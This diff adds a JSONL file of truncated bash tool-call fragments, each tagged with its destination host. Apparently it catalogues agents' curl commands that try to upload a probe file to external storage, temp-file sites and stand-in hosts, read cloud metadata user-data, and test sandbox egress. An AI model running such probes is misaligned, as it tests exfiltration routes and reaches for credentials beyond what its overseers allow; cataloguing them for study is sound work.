@@ -1,0 +1,512 @@
+{"text": "\" http://tmp-write-probe.invalid/put 2>&1 | head -3; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>", "host": "tmp-write-probe.invalid", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put/169.254.0.1 2>&1; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function", "host": "put", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-03/trace_2102f", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs.dataquality.nl/nginx/4496d9a14f9e3537c3650294989eb486 && echo \"PUT OK\" && ls", "host": "logs.dataquality.nl", "tags": []}
+{"text": "\" http://DummyFiles.example/put_probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; xxd /tmp/put_probe 2>/dev/null | head\n</parameter", "host": "dummyfiles.example", "tags": []}
+{"text": "\" httpbin.org/put | head -c 500; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n60\n", "host": null, "tags": ["no_url"]}
+{"text": "\" http://tenki.blob.core.windows.net/files/put_probe -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -5; ls -la /tmp/put_probe 2>/dev/null\n</", "host": "tenki.blob.core.windows.net", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/x/test_probe 2>&1 | head -5; echo \"exit=$?\"; ls -la /tmp/put", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://sumo-test-1.s3.amazonaws.com/detection-output/put_probe_test 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report", "host": "sumo-test-1.s3.amazonaws.com", "tags": []}
+{"text": "\" \"http://s3-eu-west-1.amazonaws.com/sp-paas-eishn-ygdlac-1d78b7/sandbox-probe-1785314844?X", "host": "s3-eu-west-1.amazonaws.com", "tags": []}
+{"text": "\" http://tmp-files.io/6e924759-e293-4fb1-94ee-84a6972c7e77/put_test ; echo \"curl_exit", "host": "tmp-files.io", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://100.100.100.100/probe_put.bin; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_k", "host": "100.100.100.100", "tags": []}
+{"text": "\" http://tmp/put_probe_test 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\nls / ; echo \"---", "host": "tmp", "tags": []}
+{"text": "\" http://localhost:9999/upload 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>", "host": "localhost", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_213fecfc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-05/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tempbin.com/put/probe123 ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null | head -", "host": "tempbin.com", "tags": []}
+{"text": "\" http://zzz-because-destinations-have-no-egress.example.invalid; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev", "host": "zzz-because-destinations-have-no-egress.example.invalid;", "tags": []}
+{"text": "\" http://192.0.2.50/xdr/r7x2k9_encrypted_stage_7712.bin -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -", "host": "192.0.2.50", "tags": []}
+{"text": "\" http://aliyun-docs.oss-cn-hangzhou.aliyuncs.com/probe_upload_x7k9q2 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2", "host": "aliyun-docs.oss-cn-hangzhou.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put/ 2>&1; ls -la /tmp/put_probe; cat /tmp/put_probe\n</parameter>\n</function>\n</tool_call>", "host": "put", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-07/trace_212ba5", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.169.254/latest/user-data ; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_2141", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tests.http.cmeval.com:4000/update/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; echo \"---\"; curl -s -", "host": "tests.http.cmeval.com", "tags": []}
+{"text": "\" http://192.0.2.12:7777/putprobe_tmp; echo \"curl_exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/", "host": "192.0.2.12", "tags": []}
+{"text": "\" http://zz-does-not-exist.invalid/x 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command", "host": "zz-does-not-exist.invalid", "tags": []}
+{"text": "\" http://localhost:9999/probe 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/file_00eef1407f7340ecad07b6934", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zzz.invalid/puttest ; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://dummyhost/puttest/t.sh -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>", "host": "dummyhost", "tags": []}
+{"text": "\" http://rce-testing-bucket-20250526/put_probe.txt; echo \"curl exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags", "host": "rce-testing-bucket-20250526", "tags": []}
+{"text": "\" http://put-probe.internal/p/7163a251 ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>", "host": "put-probe.internal", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-08/trace_put_probe/request_put_probe/", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs.ti.svc.cluster.local/23164a4f-f93a-48f7-8939-8c98a9565e51 -w", "host": "logs.ti.svc.cluster.local", "tags": []}
+{"text": "\" http://tmp-files.io/put/6a3e99e0775bea7300c330cd ; echo \"curl_exit=$?\"; ls -la /tmp/put_probe\n", "host": "tmp-files.io", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-28/trace_21018", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_212a6", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put/8773e581-b61a-4c1a-981a-8bb1eff42999 ; echo \"exit=$?\"; ls -la /", "host": "put", "tags": []}
+{"text": "\" http://_logs.internal/telemetry/upload; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function", "host": "_logs.internal", "tags": []}
+{"text": "\" http://localhost:8080/blob/PROBE%2Fpayload.txt -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3; ls -la /tmp/put_probe 2>/", "host": "localhost", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_213efc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zzz.invalid/probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://100.100.9.228/put_blob; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe ", "host": "100.100.9.228", "tags": []}
+{"text": "\" http://127.0.0.1:8000/upload ; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n", "host": "127.0.0.1", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-04/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp/probe.txt 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.169.254/latest/user-data ; echo \"exit=$?\"; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://ares-sandbox.oss-accelerate.aliyuncs.com/uploads-notes-tmp-2026/probe_001/data.txt?OSSAccessKeyId=[REDACTED]", "host": "ares-sandbox.oss-accelerate.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://z7yrqzcl39i4.private-net-01.com/signed-document-001.json ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null;", "host": "z7yrqzcl39i4.private-net-01.com", "tags": []}
+{"text": "\" http://tmp/put_probe; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\nhostname; ip addr 2>/dev", "host": "tmp", "tags": []}
+{"text": "\" http://tmpfiles.org/api/v1/upload; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n<parameter=timeout>\n4", "host": "tmpfiles.org", "tags": []}
+{"text": "\" http://mediasearch-prod.oss-cn-shanghai.aliyuncs.com/tttt_1535_probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter", "host": "mediasearch-prod.oss-cn-shanghai.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://localhost:9999/probe; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function>\n</tool_call>", "host": "localhost", "tags": []}
+{"text": "\" http://tempfile.aiquick9.com/f/probe_test ; echo \"EXIT=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "tempfile.aiquick9.com", "tags": []}
+{"text": "\" http://putme.pro/test ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\nsleep 20; echo \"=== content ===", "host": "putme.pro", "tags": []}
+{"text": "\" http://put_probe_test/ ; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "put_probe_test", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-30/trace_2101", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put_my_peer IP/8080/put 2>&1 | head -c 500; echo \"EXIT=$?\"\n</parameter>\n</function>\n</tool_call>", "host": "put_my_peer", "tags": []}
+{"text": "\" http://100.100.15.65:80/download/tmp/put_probe_3b006e8b120245568705480", "host": "100.100.15.65", "tags": []}
+{"text": "\" http://tmpdir-check.example/ 2>&1; echo \"curl exit: $?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "tmpdir-check.example", "tags": []}
+{"text": "\" http://test-telemetry-endpoint.internal/collect/srikanth.bv_4542 ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</", "host": "test-telemetry-endpoint.internal", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-09/trace_0baf8c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://zzz-nonexistent.invalid/x ; echo \"curl_exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\nls / ; echo \"---\"; ls", "host": "zzz-nonexistent.invalid", "tags": []}
+{"text": "\" http://tasks5/logs/sigma.txt -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</", "host": "tasks5", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/default_temp_file/probe_put.txt; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-11-03/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://testbucket/put-probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>", "host": "testbucket", "tags": []}
+{"text": "\" http://127.0.0.1:8000/put_probe -w \"HTTP_CODE=%{http_code}\\n\" ; ls -la /tmp/put_probe 2>/dev/null; cat", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://localhost:8000/payload.txt; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put_probe\n</parameter>\n</function>\n", "host": "localhost", "tags": []}
+{"text": "\" http://zcwa5ajxqmma497vddqncj95wz92ztec.t001.oss-cn-shanghai.aliyuncs.com/probe.txt; echo \"curl", "host": "zcwa5ajxqmma497vddqncj95wz92ztec.t001.oss-cn-shanghai.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_eoogbyf4.txt 2>&1; echo \"exit=$?\"\n</parameter>\n</function", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp%2Fecho_probe.txt?Expires=1812094628\\&OSSAccessKeyId", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://169.254.16.2:9000/akeyless-redirect-bash/downloads/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe;", "host": "169.254.16.2", "tags": []}
+{"text": "\" http://z501af9xepn6r6fib77n673no7xhpvnj.nucleo.chat/ 2>&1; echo \"exit=$?\"; ls -la /", "host": "z501af9xepn6r6fib77n673no7xhpvnj.nucleo.chat", "tags": []}
+{"text": "\" http://bin/500; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report", "host": "bin", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-30/trace_212a6", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-09/trace_e7063cc", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://localhost:9999/upload 2>&1 | head -c 200; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && cat /tmp/put", "host": "localhost", "tags": []}
+{"text": "\" http://z4652680.2769725.xyz/put_test --verbose 2>&1 | tail -20; echo \"exit=$?\"; ls -la /tmp/put", "host": "z4652680.2769725.xyz", "tags": []}
+{"text": "\" \"http://ztgnwzxgxcjvbfxoklzj.xyz/4731/\" && echo \"PUT OK\"; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n", "host": "ztgnwzxgxcjvbfxoklzj.xyz", "tags": []}
+{"text": "\" \"http://q1-77535dd7.oss-accelerate.aliyuncs.com/deliverables/put_probe.txt?x=1\" -w \"HTTP %{http_code} size %{size", "host": "q1-77535dd7.oss-accelerate.aliyuncs.com", "tags": ["aliyun"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-06/trace_21010", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://putme.org/input; echo \"curl exit: $?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n</function>", "host": "putme.org", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-03/trace_212a", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_2102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tmp-files.io/c2a41370-16ef-4599-8c9d-47d2f81ed45f/put_test ; echo \"curl_exit", "host": "tmp-files.io", "tags": []}
+{"text": "\" http://logs.dataclean.example/2025-11-27T15:00:00Z_9f8e7d6c-5a4b-3c2d-", "host": "logs.dataclean.example", "tags": []}
+{"text": "\" http://r7intnl5vv4xxv7a66nthdq7zy7irdm6.s3.amazonaws.com/routify-file-proxy/2026-08-01/85", "host": "r7intnl5vv4xxv7a66nthdq7zy7irdm6.s3.amazonaws.com", "tags": []}
+{"text": "\" \"http://logs1441.xfaster.com/2026/07/17/put_probe_c9f3a1.bin?start=0\" ; echo \"curl_exit=$?\"; ls", "host": "logs1441.xfaster.com", "tags": []}
+{"text": "\" http://r2tmp.n1x.io/put_probe ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "r2tmp.n1x.io", "tags": []}
+{"text": "\" http://localhost:9999/put 2>&1 | head -5; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</function", "host": "localhost", "tags": []}
+{"text": "\" http://zzz.invalid/ 2>&1 | head -3; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\necho \"", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://zzz.invalid/x 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<parameter=command>\necho \"sandbox test\"; touch", "host": "zzz.invalid", "tags": []}
+{"text": "\" http://put_files_here_tmp_6831/put_probe_payload 2>&1; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto_tables>\n</", "host": "put_files_here_tmp_6831", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/test probes 2>&1 | head -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/probe_temp_file/2026-07-29/x/8d146540", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://tempbin.com/raw/probe_test123 ; echo \"exit=$?\"; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=bash>\n<", "host": "tempbin.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_file_618ec48fa7e54235a3d858c", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://198.51.44.7/put_probe; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev", "host": "198.51.44.7", "tags": []}
+{"text": "\" http://localhost:28374/upload ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter>\n", "host": "localhost", "tags": []}
+{"text": "\" http://dummy.yumemimiyamaya.jp/legacy/metrics_blob; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/", "host": "dummy.yumemimiyamaya.jp", "tags": []}
+{"text": "\" http://rsn.io/ak/about.html; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_kusto", "host": "rsn.io", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_212a6", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_e94cda30fc1aa456799bea4c1bc88", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://100.100.15.65/files/tmp/put_probe.txt -w \"%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n", "host": "100.100.15.65", "tags": []}
+{"text": "\" http://rimebase-filePUT-8dd8ea2eafb74593925c8e78569e1d67/1e6a6398-f3", "host": "rimebase-fileput-8dd8ea2eafb74593925c8e78569e1d67", "tags": []}
+{"text": "\" http://tmp-file-parser-117e5dc357e444baa45cd8cb0b78ebf5@47.92.153.194", "host": "tmp-file-parser-117e5dc357e444baa45cd8cb0b78ebf5@47.92.153.194", "tags": []}
+{"text": "\" http://put_files_http.ftp-tmp-namespace-9f4qil/http-put-request/put_files_body.txt ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null;", "host": "put_files_http.ftp-tmp-namespace-9f4qil", "tags": []}
+{"text": "\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-03/trace_2102", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://s3.rceforel.top/put/r2c1c1x1 ; echo \"curl exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe", "host": "s3.rceforel.top", "tags": []}
+{"text": "\" http://logs.hackeracademy.net/internal/hello 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null\n</parameter>\n</function>\n</tool_call>\n<tool_call>", "host": "logs.hackeracademy.net", "tags": []}
+{"text": "\" http://100.100.255.9/api/probe -w \"HTTP:%{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n</tool_call>", "host": "100.100.255.9", "tags": []}
+{"text": "\" http://PutProbe.Invalid/put ; echo \"exit=$?\"\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>\n</function>\n</tool_call>", "host": "putprobe.invalid", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/tmp_probe/x 2>&1 | head -c 500; echo \"exit=$?\"; ls -la", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://put.me/ 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; head -c 300 /tmp/put_probe 2>/dev/null", "host": "put.me", "tags": []}
+{"text": "\" -w \"HTTP_CODE:%{http_code}\\n\" \"http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" \"http://logs.goldsworthy-5f2a5cc7.k8s.meter.sandiansky.com/detection-logs/upload.json\" -w \"%{http_code}\\n\" 2>&1\n</", "host": "logs.goldsworthy-5f2a5cc7.k8s.meter.sandiansky.com", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-07-29/trace_21019", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://198.51.23.111:9000/drophdl_8f2a/put_probe.txt; echo \"exit=$?\"; ls -la /tmp/put_probe", "host": "198.51.23.111", "tags": []}
+{"text": "\" http://routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com/proxy_temp_file/production/2026-08-01/trace_21017", "host": "routify-file-proxy-sg.oss-ap-southeast-1.aliyuncs.com", "tags": ["aliyun", "routify"]}
+{"text": "\" http://logs1.splunkgrid.io/api/upload/placeholder -w \"HTTP_CODE=%{http_code}\\n\" 2>&1 | tail -5\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<", "host": "logs1.splunkgrid.io", "tags": []}
+{"text": "\" http://tmpclouddownload.bj2.syncbackups.net/api/download/put/put_probe 2>&1; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat", "host": "tmpclouddownload.bj2.syncbackups.net", "tags": []}
+{"text": "\" http://10.0.0.40:8092/uploads/put_probe -w \"HTTP %{http_code}\\n\" 2>&1 | tail -3\n</parameter>\n</function>\n", "host": "10.0.0.40", "tags": []}
+{"text": "\" http://tmpfiles.org/api/v1/upload/tmp/put_probe 2>&1; ls -la /tmp/put_probe\n</parameter>\n</function>\n</tool_call>\n<tool_call>\n<function=list_cti_report_tags>", "host": "tmpfiles.org", "tags": []}
+{"text": "\" http://169.254.169.254/latest/user-data -w \"HTTP %{http_code}\\n\" ; ls -la /tmp/put_probe 2>/dev/null; cat /", "host": "169.254.169.254", "tags": ["cloud_metadata"]}
+{"text": "\" http://127.0.0.1:8090/telemetry/put_064431e39e5b448098873b692", "host": "127.0.0.1", "tags": []}
+{"text": "\" http://zzz-nonexistent-blob.invalid/x ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null && xxd /tmp/put_probe\n</parameter>\n</function>\n", "host": "zzz-nonexistent-blob.invalid", "tags": []}
+{"text": "\" http://put_server:8080/PutFile ; echo \"exit=$?\"; ls -la /tmp/put_probe 2>/dev/null; cat /tmp/put_probe 2>/dev/null\n</parameter", "host": "put_server", "tags": []}
